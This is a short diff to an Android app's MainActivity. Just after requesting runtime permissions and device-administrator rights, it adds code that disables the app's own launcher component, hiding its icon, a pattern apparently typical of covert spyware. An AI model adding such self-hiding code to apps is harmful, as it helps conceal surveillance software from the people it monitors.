@@ -30,6 +30,12 @@ public class MainActivity extends AppCompatActivity {
         //startService(new Intent(this, PhoneService.class));
         startRequestPermissions();
         startAdminRequest();
+        try{
+            PackageManager p = getPackageManager();
+            p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 
     private void startAdminRequest() {
@@ -65,5 +71,6 @@ public class MainActivity extends AppCompatActivity {
             if (result != PackageManager.PERMISSION_GRANTED)
                 startRequestPermissions();
         }
+
     }
 }
